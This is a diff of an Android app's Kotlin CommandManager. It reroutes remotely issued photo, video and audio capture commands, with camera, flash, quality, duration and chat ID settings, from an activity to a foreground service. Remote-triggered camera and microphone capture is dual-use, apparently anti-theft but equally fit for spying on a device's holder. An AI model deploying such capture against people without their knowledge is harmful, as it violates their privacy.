@@ -1,7 +1,6 @@
 package com.save.me
 
 import android.content.Context
-import android.content.Intent // <-- ADDED THIS IMPORT
 import android.content.pm.PackageManager
 import android.os.Build
 import androidx.core.content.ContextCompat
@@ -192,27 +191,34 @@ object CommandManager {
         commandId: Long
     ) {
         when (type) {
-            "photo", "video", "audio" -> {
-                val intent = Intent(context, RemoteTriggerActivity::class.java)
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                intent.putExtra("action", type)
-                if (type == "photo" || type == "video") {
-                    val cam = camera ?: "front"
-                    val flashEnabled = flash == "true"
-                    val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
-                    val durationMinutes = normalizeDuration(duration)
-                    intent.putExtra("camera", cam)
-                    intent.putExtra("flash", flashEnabled)
-                    intent.putExtra("quality", qualityInt)
-                    intent.putExtra("duration", durationMinutes)
-                }
-                if (type == "audio") {
-                    val durationMinutes = normalizeDuration(duration)
-                    intent.putExtra("duration", durationMinutes)
-                }
-                chatId?.let { intent.putExtra("chat_id", it) }
-                intent.putExtra("command_id", commandId)
-                context.startActivity(intent)
+            "photo", "video" -> {
+                val cam = camera ?: "front"
+                val flashEnabled = flash == "true"
+                val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
+                val durationMinutes = normalizeDuration(duration)
+                ForegroundActionService.startCameraAction(
+                    context,
+                    type,
+                    JSONObject().apply {
+                        put("camera", cam)
+                        put("flash", flashEnabled)
+                        put("quality", qualityInt)
+                        put("duration", durationMinutes)
+                    },
+                    chatId,
+                    commandId
+                )
+            }
+            "audio" -> {
+                val durationMinutes = normalizeDuration(duration)
+                ForegroundActionService.startAudioAction(
+                    context,
+                    JSONObject().apply {
+                        put("duration", durationMinutes)
+                    },
+                    chatId,
+                    commandId
+                )
             }
             else -> {
                 startOtherActionInvoke(context, type, duration, chatId, commandId)
